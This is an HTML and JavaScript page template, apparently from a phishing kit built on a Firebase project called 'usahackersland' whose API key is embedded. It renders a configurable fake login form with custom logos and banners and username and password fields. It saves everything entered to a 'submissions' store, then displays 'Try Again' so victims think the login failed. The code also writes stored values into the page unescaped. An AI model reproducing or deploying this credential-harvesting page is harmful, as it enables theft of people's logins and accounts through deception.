<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title></title>
<meta name="description">
<meta property="og:title">
<meta property="og:description">
<meta property="og:image">

<style>
body{
  font-family:Arial,Helvetica,sans-serif;
  background:#f4f6f8;
  padding:20px;
}

#page{
  max-width:600px;
  margin:auto;
  border-radius:10px;
  overflow:hidden;
  position:relative;
}

#content{padding:18px;position:relative}

.builder-media{text-align:center;margin-bottom:12px}
.builder-media img{max-width:140px;margin-bottom:8px}

.banner img{width:100%;border-radius:8px;margin-bottom:10px}

.gallery{
  display:grid;
  grid-template-columns:repeat(auto-fit,minmax(120px,1fr));
  gap:8px;
  margin-bottom:12px;
}
.gallery img{width:100%;border-radius:6px}

.embedLink{
  background:#e8f0fe;
  padding:8px;
  border-radius:6px;
  margin:8px 0;
  cursor:move;
  position:relative;
}

input,button{
  width:100%;
  padding:10px;
  margin:8px 0;
  border-radius:6px;
  border:1px solid #ccc;
}

button{
  border:none;
  color:#fff;
  cursor:pointer;
}

footer{
  text-align:center;
  font-size:12px;
  margin-top:14px;
  color:#777;
}

#tryAgain{
  color:#b71c1c;
  font-weight:bold;
  text-align:center;
  display:none;
}
</style>

<script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-firestore-compat.js"></script>
</head>

<body>
<div id="page">
  <div id="content">

    <div id="media" class="builder-media"></div>
    <div id="banner"></div>

    <h2 id="title"></h2>
    <p id="subtitle"></p>

    <!-- GALLERY MOVED UP -->
    <div id="gallery" class="gallery"></div>

    <p id="description"></p>

    <!-- DRAGGABLE LINKS -->
    <div id="links"></div>

    <div id="warning"></div>
    <div id="tryAgain">⚠️ Try Again</div>

    <form id="form"></form>

    <footer id="footer"></footer>

  </div>
</div>

<script>
const $=id=>document.getElementById(id);

firebase.initializeApp({
  apiKey:"AIzaSyB5zWUvl64s6wAjjeXd0mCUyhMEdzg_MmM",
  authDomain:"usahackersland.firebaseapp.com",
  projectId:"usahackersland"
});
const db=firebase.firestore();

const formId=new URLSearchParams(location.search).get("id");
let dragging=null,dx=0,dy=0;

db.collection("forms").doc(formId).get().then(doc=>{
  const f=doc.data();

  /* SEO */
  document.title=f.seoTitle||"";
  document.querySelector('meta[name="description"]').content=f.metaDesc||"";
  document.querySelector('meta[property="og:title"]').content=f.seoTitle||"";
  document.querySelector('meta[property="og:description"]').content=f.metaDesc||"";
  document.querySelector('meta[property="og:image"]').content=f.ogImage||"";

  /* MEDIA */
  if(f.avatarURL) $("media").innerHTML+=`<img src="${f.avatarURL}" style="width:90px;border-radius:50%">`;
  if(f.logoURL) $("media").innerHTML+=`<img src="${f.logoURL}">`;
  if(f.bannerURL) $("banner").innerHTML=`<img src="${f.bannerURL}" style="width:100%;border-radius:8px">`;

  /* TEXT */
  $("title").innerText=f.title||"";
  $("subtitle").innerText=f.subtitle||"";
  $("description").innerText=f.description||"";

  /* GALLERY (ABOVE DESCRIPTION ✔) */
  (f.galleryImages||[]).filter(Boolean).forEach(i=>{
    $("gallery").innerHTML+=`<img src="${i}">`;
  });

  /* DRAGGABLE LINKS */
  (f.embedLinks||[]).forEach((l,i)=>{
    if(!l.show || !l.url) return;

    const div=document.createElement("div");
    div.className="embedLink";
    div.innerHTML=`<strong>${l.text||""}</strong><br><a href="${l.url}" target="_blank">${l.url}</a>`;

    if(l.x!=null && l.y!=null){
      div.style.position="absolute";
      div.style.left=l.x+"px";
      div.style.top=l.y+"px";
    }

    div.onmousedown=e=>{
      dragging={el:div,index:i};
      dx=e.offsetX;
      dy=e.offsetY;
    };

    $("links").appendChild(div);
  });

  /* FORM */
  const form=$("form");

  if(f.addAuth){
    if(f.usernamePlaceholder) form.innerHTML+=`<input name="username" placeholder="${f.usernamePlaceholder}" required>`;
    if(f.passwordPlaceholder) form.innerHTML+=`<input type="password" name="password" placeholder="${f.passwordPlaceholder}" required>`;
  }

  (f.extraFields||[]).filter(Boolean).forEach(v=>{
    form.innerHTML+=`<input name="${v}" placeholder="${v}" required>`;
  });

  if(f.showMainBtn){
    const b=document.createElement("button");
    b.textContent=f.buttonText;
    b.style.background=f.btnColor;
    b.onclick=e=>submitForm(e,f);
    form.appendChild(b);
  }

  if(f.footerText) $("footer").innerText=f.footerText;
});

/* DRAG SAVE */
document.onmousemove=e=>{
  if(!dragging) return;
  const c=$("content").getBoundingClientRect();
  dragging.el.style.left=(e.clientX-c.left-dx)+"px";
  dragging.el.style.top=(e.clientY-c.top-dy)+"px";
};
document.onmouseup=()=>{
  if(dragging){
    const el=dragging.el;
    db.collection("forms").doc(formId).update({
      [`embedLinks.${dragging.index}.x`]:parseInt(el.style.left),
      [`embedLinks.${dragging.index}.y`]:parseInt(el.style.top)
    });
  }
  dragging=null;
};

/* SUBMIT */
function submitForm(e,f){
  e.preventDefault();
  const data={};
  document.querySelectorAll("#form input").forEach(i=>data[i.name]=i.value);

  db.collection("submissions").add({
    formId,
    data,
    createdAt:new Date().toISOString()
  }).then(()=>{
    $("tryAgain").style.display="block";
    setTimeout(()=>$("tryAgain").style.display="none",3000);
  });
}
</script>
</body>
</html>
